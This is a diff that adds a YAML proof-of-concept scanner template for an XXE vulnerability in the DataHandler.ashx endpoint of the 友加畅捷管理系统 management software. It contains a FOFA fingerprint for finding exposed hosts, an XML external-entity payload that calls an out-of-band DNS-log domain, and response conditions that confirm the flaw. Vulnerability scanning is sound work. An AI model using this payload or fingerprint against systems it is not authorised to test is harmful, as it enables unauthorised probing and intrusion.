@@ -1,0 +1,29 @@
+id: poc-yaml-youjiasoft-datahandler-ashx-xxe
+info:
+  name: 友加畅捷管理系统 DataHandler.ashx XXE漏洞
+  severity: high
+  tags:
+  - xxe
+  - DNSLOG
+  finger: 友加畅捷管理系统
+  fofa: icon_hash="2049187099"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /Report/DataHandler.ashx?Type=SaveData
+  headers:
+    Content-Type: application/xml
+  data: '<?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE root [
+
+    <!ENTITY % remote SYSTEM "http://{{.domain}}/xxe_test">
+
+    %remote;]>
+
+    <root/>'
+  expression: status_code == 200 && contains(body,"err:0") && contains(body,"未能解析此远程名称:")
+    && !contains(body,"<") && reverse.Verify()
+transport: http
